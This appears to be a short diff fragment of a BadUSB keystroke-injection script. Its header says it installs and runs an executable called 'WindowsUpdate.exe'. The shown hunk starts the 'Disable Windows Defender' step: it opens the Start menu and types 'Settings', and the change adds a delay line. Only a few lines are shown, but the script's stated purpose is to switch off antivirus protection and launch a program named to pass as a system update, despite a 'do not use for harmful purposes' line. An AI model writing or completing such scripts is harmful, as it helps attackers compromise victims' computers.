@@ -4,6 +4,7 @@ REM DESCRIPTION: Installs ands runs Enderman's WindowsUpdate.exe.
 REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 
 REM Disable Windows Defender:
+DELAY 1000
 CONTROL ESCAPE
 DELAY 500
 STRING Settings
